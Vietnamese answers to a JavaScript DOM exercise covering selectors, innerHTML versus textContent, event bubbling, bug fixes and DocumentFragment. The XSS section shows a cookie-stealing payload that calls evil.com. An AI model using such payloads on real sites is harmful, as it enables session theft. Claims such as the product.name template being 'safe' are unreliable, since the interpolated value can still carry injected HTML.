## PHẦN A

Câu A1:

---

### 1. Sơ đồ cây DOM

```
document
└── html
    └── body
        └── div#app
            ├── header
            │   ├── h1
            │   │   └── "Todo App"
            │   └── nav
            │       ├── a.active
            │       │   └── "All"
            │       ├── a
            │       │   └── "Active"
            │       └── a
            │           └── "Completed"
            └── main
                ├── form#todoForm
                │   ├── input#todoInput [type="text"]
                │   └── button [type="submit"]
                │       └── "Add"
                └── ul#todoList
                    ├── li.todo-item
                    │   └── "Learn HTML"
                    └── li.todo-item.completed
                        └── "Learn CSS"
```

---

### 2. querySelector

```js
// Chọn thẻ <h1>
document.querySelector("h1");

// Chọn input trong form
document.querySelector("#todoForm input");

// Chọn tất cả .todo-item
document.querySelectorAll(".todo-item");

// Chọn link đang active
document.querySelector("a.active");

// Chọn <li> đầu tiên trong #todoList
document.querySelector("#todoList li:first-child");

// Chọn tất cả <a> bên trong <nav>
document.querySelectorAll("nav a");
```

Câu A2:

---

## So sánh

|             | `innerHTML`                   | `textContent`                 |
| ----------- | ----------------------------- | ----------------------------- |
| **Đọc**     | Trả về HTML kể cả thẻ tag     | Trả về text thuần, bỏ hết tag |
| **Ghi**     | Parse và render HTML          | Ghi thẳng chuỗi, không parse  |
| **Tốc độ**  | Chậm hơn (phải parse DOM)     | Nhanh hơn                     |
| **Bảo mật** | ⚠️ Nguy hiểm với dữ liệu user | ✅ An toàn                    |

---

## Ví dụ minh họa

```js
const el = document.querySelector("#box");

// innerHTML → render thẻ HTML
el.innerHTML = "<strong>Hello</strong>"; // hiện chữ đậm: Hello

// textContent → hiện nguyên chuỗi
el.textContent = "<strong>Hello</strong>"; // hiện literal: <strong>Hello</strong>
```

---

## Khi nào dùng cái nào?

**Dùng `innerHTML`** khi bạn tự tạo HTML, không phụ thuộc input của user:

```js
// ✅ An toàn vì string là do dev tự viết
container.innerHTML = `
  <div class="card">
    <h2>${product.name}</h2>
    <p>${product.price}</p>
  </div>
`;
```

**Dùng `textContent`** khi hiển thị dữ liệu từ user hoặc API:

```js
// ✅ An toàn dù user nhập gì
document.querySelector("#username").textContent = user.name;
document.querySelector("#result").textContent = searchQuery;
```

---

## Lỗ hổng XSS với innerHTML

### XSS là gì?

**Cross-Site Scripting (XSS)**: kẻ tấn công inject code JS độc hại vào trang web, trình duyệt của nạn nhân sẽ thực thi đoạn code đó.

### Ví dụ tấn công

```js
// User nhập vào ô tìm kiếm:
// <img src=x onerror="alert('Hacked!')">

const userInput = document.querySelector("#search").value;
document.querySelector("#result").innerHTML = userInput;
// ↑ Trình duyệt parse HTML → tạo thẻ <img>
//   src=x không load được → kích hoạt onerror
//   → alert() chạy
//   Thực tế: thay alert() bằng code đánh cắp cookie, redirect, v.v.
```

### Hậu quả thực tế

```js
// Kẻ tấn công có thể inject:
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

// → đánh cắp toàn bộ cookie (session, auth token...)
```

---

Câu A3:

---

### Output khi click button (bình thường)

```
BUTTON
INNER
OUTER
```

Event nổi bọt từ phần tử được click lên các phần tử cha theo thứ tự:

```
button#btn  →  div#inner  →  div#outer  →  body  →  html  →  document
   ↓               ↓              ↓
"BUTTON"        "INNER"        "OUTER"
```

---

### Output khi uncomment `e.stopPropagation()`

```
BUTTON
```

`stopPropagation()` dừng event tại `#btn`, không cho nổi bọt lên `#inner` và `#outer` nữa.

---

### Giải thích cơ chế Event Bubbling

Khi click vào một phần tử, trình duyệt xử lý event theo 3 phase:

```
1. CAPTURE (đi xuống):  document → html → body → #outer → #inner → #btn
2. TARGET:              #btn xử lý event
3. BUBBLE (đi lên):    #btn → #inner → #outer → body → html → document
```

Mặc định `addEventListener` lắng nghe ở phase **BUBBLE** (phase 3).  
Muốn lắng nghe ở phase CAPTURE thêm `true` làm tham số thứ 3:

```js
element.addEventListener("click", handler, true); // capture phase
```

---

### Các phương thức kiểm soát Event

| Phương thức                    | Tác dụng                                                                         |
| ------------------------------ | -------------------------------------------------------------------------------- |
| `e.stopPropagation()`          | Dừng bubble, event không lan lên phần tử cha                                     |
| `e.stopImmediatePropagation()` | Dừng bubble VÀ dừng các listener khác trên cùng phần tử                          |
| `e.preventDefault()`           | Hủy hành động mặc định (submit form, follow link...) nhưng **không** dừng bubble |

---

## PHẦN C

Câu C1:

### Danh sách lỗi và cách sửa

---

### Lỗi 1: `addEventListener("onclick", ...)` — sai tên event

**Dòng:** `document.querySelector("#decrementBtn").addEventListener("onclick", ...)`

- ❌ Sai: `"onclick"` — đây là HTML attribute, không phải DOM event name
- ✅ Sửa: `"click"`

```js
// ❌ Sai
document.querySelector("#decrementBtn").addEventListener("onclick", function() { ... });

// ✅ Đúng
document.querySelector("#decrementBtn").addEventListener("click", function() { ... });
```

---

### Lỗi 2: Decrement không lưu history

**Dòng:** Trong handler của `#decrementBtn`, không có code thêm history

- ❌ Sai: Chỉ update `countDisplay` nhưng không thêm `<li>` vào `historyList`
- ✅ Sửa: Thêm đoạn lưu history giống như increment

```js
// ✅ Đúng
document.querySelector("#decrementBtn").addEventListener("click", function () {
  count--;
  countDisplay.innerHTML = count;

  const li = document.createElement("li");
  li.textContent = "Count changed to " + count;
  li.addEventListener("click", function () {
    deleteHistory(this);
  });
  historyList.append(li);
});
```

---

### Lỗi 3: `countDisplay = count` — gán đè biến DOM

**Dòng:** `countDisplay = count;` trong handler của `#resetBtn`

- ❌ Sai: `countDisplay` là một DOM element, không thể gán giá trị số trực tiếp — gán như vậy sẽ phá hủy reference đến element
- ✅ Sửa: `countDisplay.innerHTML = count;` hoặc `countDisplay.textContent = count;`

```js
// ❌ Sai
countDisplay = count;

// ✅ Đúng
countDisplay.innerHTML = count;
```

---

### Lỗi 4: `historyList.innerHTML = null` — gán null không hợp lệ

**Dòng:** `historyList.innerHTML = null;`

- ❌ Sai: Gán `null` cho `innerHTML` sẽ render thành chuỗi `"null"` trong một số trình duyệt
- ✅ Sửa: Gán chuỗi rỗng `""`

```js
// ❌ Sai
historyList.innerHTML = null;

// ✅ Đúng
historyList.innerHTML = "";
```

---

### Lỗi 5: `item.remove` — thiếu dấu `()` để gọi hàm

**Dòng:** `item.remove;` trong `forEach` của `#clearHistory`

- ❌ Sai: `item.remove` chỉ tham chiếu đến hàm, không gọi nó
- ✅ Sửa: `item.remove();`

```js
// ❌ Sai
items.forEach((item) => {
  item.remove;
});

// ✅ Đúng
items.forEach((item) => {
  item.remove();
});
```

---

### Lỗi 6: `localStorage.getItem("count")` trả về string, không phải number

**Dòng:** `count = localStorage.getItem("count");`

- ❌ Sai: `localStorage` luôn lưu và trả về **string**. Gán thẳng vào `count` (number) sẽ khiến các phép tính sau bị lỗi (e.g. `0 + "5"` = `"05"`)
- ✅ Sửa: Parse về số với `parseInt()` hoặc `Number()`

```js
// ❌ Sai
count = localStorage.getItem("count");

// ✅ Đúng
count = parseInt(localStorage.getItem("count")) || 0;
```

---

### Lỗi 7: Load từ localStorage không restore history

**Dòng:** Trong `window.addEventListener("load", ...)` chỉ restore `count`, không restore `historyList`

- ❌ Sai: `historyList.innerHTML` đã được lưu nhưng không được load lại
- ✅ Sửa: Thêm restore history, và cần re-attach event listener cho các `<li>` đã restore

```js
// ✅ Đúng
window.addEventListener("load", () => {
  count = parseInt(localStorage.getItem("count")) || 0;
  countDisplay.textContent = count;

  const savedHistory = localStorage.getItem("history");
  if (savedHistory) {
    historyList.innerHTML = savedHistory;
    // Re-attach delete listeners cho các li đã được restore
    historyList.querySelectorAll("li").forEach((li) => {
      li.addEventListener("click", function () {
        deleteHistory(this);
      });
    });
  }
});
```

---

Câu C2:

---

Khi viết:

```js
document.querySelectorAll(".item").forEach((item) => {
  item.addEventListener("click", handleClick);
});
```

Có **3 vấn đề nghiêm trọng**:

#### ❶ Tốn bộ nhớ (Memory)

- Mỗi `addEventListener` tạo ra **1 event listener object** lưu trong bộ nhớ
- 1000 elements = **1000 listener objects** tồn tại đồng thời trong heap
- Với app lớn (list dài, nhiều loại event), bộ nhớ bị ăn nhanh → lag, crash trên thiết bị yếu

#### ❷ Elements động không được bind (Dynamic Elements)

```js
// Các li được bind sẵn
document.querySelectorAll("li").forEach((li) => {
  li.addEventListener("click", handleClick);
});

// Thêm item mới SAU KHI bind → KHÔNG có event listener!
const newLi = document.createElement("li");
list.appendChild(newLi); // ← click vào đây sẽ không có gì xảy ra
```

Mỗi lần thêm element mới phải **bind lại thủ công** → dễ quên, dễ bug.

#### ❸ Chi phí khởi tạo cao

- Khi trang load, JS phải duyệt qua 1000 nodes và gọi `addEventListener` 1000 lần
- Blocking main thread lâu hơn → **trang load chậm hơn**

---

### Event Delegation giải quyết thế nào?

**Nguyên lý:** Lợi dụng cơ chế **Event Bubbling** — event từ element con sẽ "nổi bọt" (bubble) lên các element cha.

```
[document]
    └── [ul#list]           ← Chỉ bind 1 listener ở đây
            ├── [li] click! → bubble lên ul → listener kích hoạt
            ├── [li]
            └── [li]
```

**Cách implement:**

```js
// ❌ BAD — 1000 listeners
document.querySelectorAll(".item").forEach((item) => {
  item.addEventListener("click", handleClick);
});

// ✅ GOOD — Event Delegation, chỉ 1 listener
document.querySelector("#list").addEventListener("click", function (e) {
  // Kiểm tra xem click có đúng target mong muốn không
  if (e.target.classList.contains("item")) {
    handleClick(e.target);
  }
});
```

### Vấn đề của code gốc

```js
for (let i = 0; i < 1000; i++) {
  const div = document.createElement("div");
  div.textContent = `Item ${i}`;
  document.body.appendChild(div); // ← 1000 lần reflow!
}
```

Mỗi lần `appendChild` trực tiếp vào DOM thật:

1. Trình duyệt phải **tính toán lại layout** (reflow) — tính lại vị trí, kích thước của toàn bộ trang
2. Sau đó **vẽ lại màn hình** (repaint)
3. Lặp lại **1000 lần** → cực kỳ tốn tài nguyên

```
Vòng lặp 1: appendChild → REFLOW → REPAINT
Vòng lặp 2: appendChild → REFLOW → REPAINT
...
Vòng lặp 1000: appendChild → REFLOW → REPAINT
                                ↑
                        1000 lần reflow!
```

---

### Refactor dùng DocumentFragment

```js
// ✅ Tạo một "DOM ảo" tạm thời — không nằm trong document thật
const fragment = document.createDocumentFragment();

for (let i = 0; i < 1000; i++) {
  const div = document.createElement("div");
  div.textContent = `Item ${i}`;
  fragment.appendChild(div); // ← Thêm vào fragment, KHÔNG gây reflow
}

// Chỉ 1 lần duy nhất chạm vào DOM thật → chỉ 1 lần reflow!
document.body.appendChild(fragment);
```

---

### Tại sao nhanh hơn?

**DocumentFragment** là một **"DOM ảo"** (virtual container) tồn tại trong bộ nhớ, **không được gắn vào document thật**. Vì không thuộc document nên mọi thao tác với nó **không kích hoạt reflow/repaint**.

```
Fragment (in-memory, không thuộc document):
    ├── div "Item 0"   ← appendChild, KHÔNG reflow
    ├── div "Item 1"   ← appendChild, KHÔNG reflow
    ├── ...
    └── div "Item 999" ← appendChild, KHÔNG reflow

document.body.appendChild(fragment)
    → Fragment bị "hòa tan" vào DOM thật
    → Trình duyệt reflow & repaint DUY NHẤT 1 LẦN
```
